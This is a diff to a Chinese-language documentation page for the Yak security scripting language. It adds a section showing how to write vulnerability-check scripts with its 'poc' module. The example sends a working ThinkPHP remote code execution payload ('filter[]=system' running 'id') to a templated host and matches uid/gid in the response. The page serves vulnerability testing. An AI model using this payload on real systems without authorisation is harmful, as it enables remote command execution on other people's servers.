@@ -24,6 +24,7 @@ sidebar_position: 11
 
 ## Yak 中可以用来编写 PoC/Exp 的模块
 
+1. 【最推荐】[`poc` 最简单的方案进行 PoC 发包](/docs/api/poc)
 1. [`http` 模块用于发最基础的 HTTP 请求](/docs/buildinlibs/lib_http)
 1. [`fuzz` 用于构造可用于模糊测试的 HTTP 请求](/docs/buildinlibs/lib_fuzz)
 1. [`nuclei` 构造适配于 nuclei yaml poc 的 PoC](/docs/buildinlibs/lib_nuclei)
@@ -75,6 +76,53 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 ```
 
 针对这个数据包，我么可以有下面主要三种方法来构造 PoC，举最简单的例子。
+
+### 使用 `poc` 构建 PoC
+
+由于绝大部分的 Web 类 PoC 都是发送一个数据包，检查结果。因此我们可以定向针对这种情况做优化。
+
+例如，我们可以精准替换掉数据包中参数的内容，而不需要专门去构造一个数据包的各种其他 "无关" 的参数。
+
+最简单暴力的就是，我们直接发送一个数据包！
+
+在如下例子中，我们通过 `func poc.HTTP(packetRaw: string|[]byte, extraParams ...opt) (responseRaw: []byte, requestRaw: []byte, err error)` 这个函数可以直接发送一个数据包。
+
+遇到需要替换的部分，可以使用 `{{param(name)}}` 标签来标记，然后标记中 `param()` 中括号中的内容是我们需要替换的参数名称。
+
+例如如下案例，我们在 `Host: {{param(target)}}` 中标记了参数，通过 `poc.HTTP(packet, http.params({"target": "localhost:8080"}))` 中的 `http.params` 可以替换掉标记的内容。
+
+从而构建一个完整的数据包，这个数据包可以直接通过 `poc.HTTP` 发送出去，把最最原始的结果返回给用户。
+
+返回的内容有三个参数，分别是
+
+1. response 的原始数据包内容
+1. request 原始数据包内容
+1. error 失败原因（如果没有失败，这个值为 `nil`） 
+
+具体代码如下
+
+```go
+rsp, req, err := poc.HTTP(`
+POST /index.php?s=captcha HTTP/1.1
+Host: {{param(target)}}
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+
+_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
+`, poc.params({
+    "target": "localhost:8080"
+}))
+die(err)
+
+if re.Match(`((uid\=\d*)|(gid\=\d*)|(groups=\d*))`, rsp) {
+    println("found thinkphp vuls...")
+    break
+}
+```
+
+当然如果需要针对返回的数据包进行精细化处理，可以参考 [`poc` 辅助库中所有可用参数](/docs/api/poc)
 
 ### 使用 `http` 构造 PoC
 
